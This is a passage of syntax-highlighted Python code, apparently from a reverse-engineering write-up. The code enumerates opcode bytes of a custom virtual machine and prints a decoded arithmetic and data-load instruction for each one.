</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>X</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; : &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>machine_code</span> <span class=o>+</span> <span class=n>reg_1</span> <span class=o>+</span> <span class=s2>&#34; = &#34;</span> <span class=o>+</span> <span class=n>vm_type</span> <span class=o>+</span> <span class=s2>&#34;(&#34;</span> <span class=o>+</span> <span class=n>reg_2</span> <span class=o>+</span> <span class=s2>&#34; - &#34;</span> <span class=o>+</span> <span class=n>reg_3</span> <span class=o>+</span> <span class=s2>&#34;)&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># opcode X Y</span>
</span></span><span class=line><span class=cl><span class=c1># case 2</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span> <span class=mh>0x10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>op_code</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>X</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&amp;</span> <span class=mh>0x1f</span><span class=p>)</span> <span class=o>!=</span> <span class=mh>0x02</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_arr</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;(int8)&#39;</span><span class=p>,</span><span class=s1>&#39;(int16)&#39;</span><span class=p>,</span><span class=s1>&#39;int(32)&#39;</span><span class=p>,</span><span class=s1>&#39;int(64)&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_num</span> <span class=o>=</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type</span> <span class=o>=</span> <span class=n>vm_type_arr</span><span class=p>[</span><span class=n>vm_type_num</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_1</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_2</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_1</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_2</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>op_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>X</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; Y : &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>machine_code</span> <span class=o>+</span> <span class=n>reg_1</span> <span class=o>+</span> <span class=s2>&#34; = &#34;</span> <span class=o>+</span> <span class=n>vm_type</span> <span class=o>+</span> <span class=s2>&#34;(&#34;</span> <span class=o>+</span> <span class=n>reg_2</span> <span class=o>+</span> <span class=s2>&#34; - &#34;</span> <span class=o>+</span> <span class=s2>&#34;Y&#34;</span> <span class=o>+</span> <span class=s2>&#34;)&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># opcode X</span>
</span></span><span class=line><span class=cl><span class=c1># case 3</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span> <span class=mh>0x10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>op_code</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>X</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&amp;</span> <span class=mh>0x1f</span><span class=p>)</span> <span class=o>!=</span> <span class=mh>0x13</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_1</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_2</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_3</span> <span class=o>=</span> <span class=n>X</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_1</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_2</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_3</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_arr</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;(int8)&#39;</span><span class=p>,</span><span class=s1>&#39;(int16)&#39;</span><span class=p>,</span><span class=s1>&#39;int(32)&#39;</span><span class=p>,</span><span class=s1>&#39;int(64)&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_num</span> <span class=o>=</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type</span> <span class=o>=</span> <span class=n>vm_type_arr</span><span class=p>[</span><span class=n>vm_type_num</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>op_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>X</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; : &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>machine_code</span> <span class=o>+</span> <span class=n>reg_1</span> <span class=o>+</span> <span class=s2>&#34; = &#34;</span> <span class=o>+</span> <span class=n>vm_type</span> <span class=o>+</span> <span class=s2>&#34;(&#34;</span> <span class=o>+</span> <span class=n>reg_2</span> <span class=o>+</span> <span class=s2>&#34; * &#34;</span> <span class=o>+</span> <span class=n>reg_3</span> <span class=o>+</span> <span class=s2>&#34;)&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># opcode X Y</span>
</span></span><span class=line><span class=cl><span class=c1># case 3</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span> <span class=mh>0x10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>op_code</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>X</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&amp;</span> <span class=mh>0x1f</span><span class=p>)</span> <span class=o>!=</span> <span class=mh>0x03</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_arr</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;(int8)&#39;</span><span class=p>,</span><span class=s1>&#39;(int16)&#39;</span><span class=p>,</span><span class=s1>&#39;int(32)&#39;</span><span class=p>,</span><span class=s1>&#39;int(64)&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_num</span> <span class=o>=</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type</span> <span class=o>=</span> <span class=n>vm_type_arr</span><span class=p>[</span><span class=n>vm_type_num</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_1</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_2</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_1</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_2</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>op_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>X</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; Y : &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>machine_code</span> <span class=o>+</span> <span class=n>reg_1</span> <span class=o>+</span> <span class=s2>&#34; = &#34;</span> <span class=o>+</span> <span class=n>vm_type</span> <span class=o>+</span> <span class=s2>&#34;(&#34;</span> <span class=o>+</span> <span class=n>reg_2</span> <span class=o>+</span> <span class=s2>&#34; * &#34;</span> <span class=o>+</span> <span class=s2>&#34;Y&#34;</span> <span class=o>+</span> <span class=s2>&#34;)&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># opcode X</span>
</span></span><span class=line><span class=cl><span class=c1># case 4</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span> <span class=mh>0x10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>op_code</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>X</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&amp;</span> <span class=mh>0x1f</span><span class=p>)</span> <span class=o>!=</span> <span class=mh>0x14</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_1</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_2</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_3</span> <span class=o>=</span> <span class=n>X</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_1</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_2</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_3</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_arr</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;(int8)&#39;</span><span class=p>,</span><span class=s1>&#39;(int16)&#39;</span><span class=p>,</span><span class=s1>&#39;int(32)&#39;</span><span class=p>,</span><span class=s1>&#39;int(64)&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_num</span> <span class=o>=</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type</span> <span class=o>=</span> <span class=n>vm_type_arr</span><span class=p>[</span><span class=n>vm_type_num</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>op_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>X</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; : &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>machine_code</span> <span class=o>+</span> <span class=n>reg_1</span> <span class=o>+</span> <span class=s2>&#34; = &#34;</span> <span class=o>+</span> <span class=n>vm_type</span> <span class=o>+</span> <span class=s2>&#34;(&#34;</span> <span class=o>+</span> <span class=n>reg_2</span> <span class=o>+</span> <span class=s2>&#34; / &#34;</span> <span class=o>+</span> <span class=n>reg_3</span> <span class=o>+</span> <span class=s2>&#34;)&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># opcode X Y</span>
</span></span><span class=line><span class=cl><span class=c1># case 4</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span> <span class=mh>0x10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>op_code</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>X</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&amp;</span> <span class=mh>0x1f</span><span class=p>)</span> <span class=o>!=</span> <span class=mh>0x04</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_arr</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;(int8)&#39;</span><span class=p>,</span><span class=s1>&#39;(int16)&#39;</span><span class=p>,</span><span class=s1>&#39;int(32)&#39;</span><span class=p>,</span><span class=s1>&#39;int(64)&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_num</span> <span class=o>=</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type</span> <span class=o>=</span> <span class=n>vm_type_arr</span><span class=p>[</span><span class=n>vm_type_num</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_1</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_2</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&gt;&gt;</span> <span class=mi>2</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>7</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_1</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_2</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>op_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>X</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; Y : &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>machine_code</span> <span class=o>+</span> <span class=n>reg_1</span> <span class=o>+</span> <span class=s2>&#34; = &#34;</span> <span class=o>+</span> <span class=n>vm_type</span> <span class=o>+</span> <span class=s2>&#34;(&#34;</span> <span class=o>+</span> <span class=n>reg_2</span> <span class=o>+</span> <span class=s2>&#34; / &#34;</span> <span class=o>+</span> <span class=s2>&#34;Y&#34;</span> <span class=o>+</span> <span class=s2>&#34;)&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># opcode X Y Y</span>
</span></span><span class=line><span class=cl><span class=c1># case 5</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span> <span class=mh>0x10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>op_code</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>X</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>)</span> <span class=o>!=</span> <span class=mh>0x5</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_1</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_1</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_arr</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;(int8)&#39;</span><span class=p>,</span><span class=s1>&#39;(int16)&#39;</span><span class=p>,</span><span class=s1>&#39;int(32)&#39;</span><span class=p>,</span><span class=s1>&#39;int(64)&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_num</span> <span class=o>=</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type</span> <span class=o>=</span> <span class=n>vm_type_arr</span><span class=p>[</span><span class=n>vm_type_num</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>op_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>X</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; Y Y : &#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>out</span> <span class=o>=</span> <span class=n>machine_code</span> <span class=o>+</span> <span class=n>reg_1</span> <span class=o>+</span> <span class=s2>&#34; = &#34;</span> <span class=o>+</span> <span class=n>vm_type</span> <span class=o>+</span> <span class=s2>&#34;(&#34;</span> <span class=o>+</span> <span class=s2>&#34;DATA[&#34;</span> <span class=o>+</span> <span class=s2>&#34;YY&#34;</span><span class=o>+</span> <span class=s2>&#34;])&#34;</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>out</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># opcode X Y Y</span>
</span></span><span class=line><span class=cl><span class=c1># case 6</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mh>0x1000</span><span class=p>,</span> <span class=mh>0x10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>op_code</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&gt;&gt;</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=n>X</span> <span class=o>=</span> <span class=n>i</span> <span class=o>&amp;</span> <span class=mh>0xff</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&amp;</span> <span class=mh>0xf</span><span class=p>)</span> <span class=o>!=</span> <span class=mh>0x6</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>    <span class=n>idx_1</span> <span class=o>=</span> <span class=p>(</span><span class=n>X</span> <span class=o>&amp;</span> <span class=mi>3</span><span class=p>)</span> <span class=o>*</span> <span class=mi>2</span> <span class=o>+</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>reg_1</span> <span class=o>=</span> <span class=s2>&#34;R&#34;</span> <span class=o>+</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx_1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_arr</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;(int8)&#39;</span><span class=p>,</span><span class=s1>&#39;(int16)&#39;</span><span class=p>,</span><span class=s1>&#39;int(32)&#39;</span><span class=p>,</span><span class=s1>&#39;int(64)&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type_num</span> <span class=o>=</span> <span class=p>(</span><span class=n>op_code</span> <span class=o>&gt;&gt;</span> <span class=mi>5</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>3</span>
</span></span><span class=line><span class=cl>    <span class=n>vm_type</span> <span class=o>=</span> <span class=n>vm_type_arr</span><span class=p>[</span><span class=n>vm_type_num</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>=</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%02X</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>op_code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>machine_code</span> <span class=o>+=</span> <span class=s2>&#34; &#34;</span>
